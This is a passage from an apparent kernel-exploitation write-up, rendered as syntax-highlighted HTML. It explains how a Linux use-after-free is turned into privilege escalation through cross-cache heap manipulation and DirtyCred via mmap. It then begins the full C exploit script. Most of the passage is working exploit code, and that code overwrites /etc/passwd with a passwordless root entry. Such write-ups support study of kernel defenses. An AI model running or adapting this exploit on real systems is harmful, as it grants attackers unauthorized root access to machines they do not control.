</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NUM_SPRAY_FDS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">lseek</span><span class="p">(</span><span class="n">spray_fds</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span> <span class="p">,</span><span class="n">SEEK_CUR</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">freed_fd</span> <span class="o">=</span> <span class="n">spray_fds</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nf">lseek</span><span class="p">(</span><span class="n">freed_fd</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Found freed fd: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">freed_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">freed_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fatal</span><span class="p">(</span><span class="s">&#34;Failed to find FD&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we manage to identify it, it means that the cross-cache operations have been successfully completed. To trigger the <code>DirtyCred</code>, we simply need to call <code>mmap</code> on the <code>freed_fd</code>, then close it, followed by closing all instances of <code>spray_fds_2</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="c1">// mmap trick instead of race with write
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] DirtyCred via mmap&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">file_mmap</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">freed_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// After: 3 fd 2 refcount (Because new file)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">freed_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// After: 2 fd 1 refcount (Because new file)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NUM_SPRAY_FDS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">spray_fds_2</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// After: 1 fd 0 refcount (Because new file)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Effect: FD in mmap (which is writeable) can be replaced with RDONLY file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NUM_SPRAY_FDS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">spray_fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/etc/passwd&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// After: 2 fd 1 refcount (but writeable due to mmap)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">file_mmap</span><span class="p">,</span> <span class="s">&#34;root::0:0:root:/root:/bin/sh</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>At this point, due to the UAF, the <code>file</code> object&rsquo;s <code>refcount</code> will reduce to zero after closing <code>spray_fds_2</code>, causing it to be released, yet the <code>mmap</code> still has an open FD linked to that released chunk.</p>
<p>As a final step, we spray once more using the read-only file <code>/etc/passwd</code>, hoping that one of the newly sprayed files will occupy the chunk that is now addressed by <code>mmap</code>. Given that <code>mmap</code> was initiated with write permissions, we can modify the contents of the chunk pointed to by <code>mmap</code>, despite it having <code>read-only</code> access initially. Overwriting the <code>/etc/passwd</code> will allow us to get privilege escalation :).</p>
<p>Below is the full script of the exploit:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span><span class="lnt">360
</span><span class="lnt">361
</span><span class="lnt">362
</span><span class="lnt">363
</span><span class="lnt">364
</span><span class="lnt">365
</span><span class="lnt">366
</span><span class="lnt">367
</span><span class="lnt">368
</span><span class="lnt">369
</span><span class="lnt">370
</span><span class="lnt">371
</span><span class="lnt">372
</span><span class="lnt">373
</span><span class="lnt">374
</span><span class="lnt">375
</span><span class="lnt">376
</span><span class="lnt">377
</span><span class="lnt">378
</span><span class="lnt">379
</span><span class="lnt">380
</span><span class="lnt">381
</span><span class="lnt">382
</span><span class="lnt">383
</span><span class="lnt">384
</span><span class="lnt">385
</span><span class="lnt">386
</span><span class="lnt">387
</span><span class="lnt">388
</span><span class="lnt">389
</span><span class="lnt">390
</span><span class="lnt">391
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//gcc -pthread -no-pie -static ../../exploit.c  -o exp 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define _GNU_SOURCE
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;limits.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stddef.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;poll.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdnoreturn.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/userfaultfd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ipc.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/msg.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/timerfd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/capability.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/xattr.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/io_uring.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/membarrier.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/io_uring.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/membarrier.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define logd(fmt, ...) fprintf(stderr, (fmt), ##__VA_ARGS__)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define CC_OVERFLOW_FACTOR 5    </span><span class="c1">// Used to handle fragmentation
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define OBJS_PER_SLAB 8         </span><span class="c1">// Fetch this from /sys/kernel/slab/kmalloc-1k/objs_per_slab
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define CPU_PARTIAL 24          </span><span class="c1">// Fetch this from /sys/kernel/slab/kmalloc-1k/cpu_partial
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define MSG_SIZE 0x400-48       </span><span class="c1">// kmalloc-1k (because CONFIG_MEMCG_KMEM is disabled, we can use msg_msg)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">noreturn</span> <span class="kt">void</span> <span class="nf">fatal</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* 
</span></span></span><span class="line"><span class="cl"><span class="cm">Cross-cache abstraction taken from https://org.anize.rs/HITCON-2022/pwn/fourchain-kernel
</span></span></span><span class="line"><span class="cl"><span class="cm">Notes that here is minor adjustments that we made to the abstraction
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="k">enum</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">CC_RESERVE_PARTIAL_LIST</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">CC_ALLOC_VICTIM_PAGE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">CC_FILL_VICTIM_PAGE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">CC_EMPTY_VICTIM_PAGE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">CC_OVERFLOW_PARTIAL_LIST</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">cross_cache</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">objs_per_slab</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">cpu_partial</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int64_t</span> <span class="o">*</span><span class="n">overflow_objs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int64_t</span> <span class="o">*</span><span class="n">pre_victim_objs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int64_t</span> <span class="o">*</span><span class="n">post_victim_objs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">phase</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">allocate</span><span class="p">)(</span><span class="kt">int64_t</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">free</span><span class="p">)(</span><span class="kt">int64_t</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">kmalloc1k_cc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">cc_allocate</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                  <span class="kt">int64_t</span> <span class="o">*</span><span class="n">repo</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                  <span class="kt">uint32_t</span> <span class="n">to_alloc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">to_alloc</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int64_t</span> <span class="n">ref</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="nf">allocate</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ref</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">ref</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">cc_free</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                              <span class="kt">int64_t</span> <span class="o">*</span><span class="n">repo</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                              <span class="kt">uint32_t</span> <span class="n">to_free</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                              <span class="kt">bool</span> <span class="n">per_slab</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">to_free</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// if per_slab is true, The target is to free one object per slab.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="n">per_slab</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">cc</span><span class="o">-&gt;</span><span class="nf">free</span><span class="p">(</span><span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
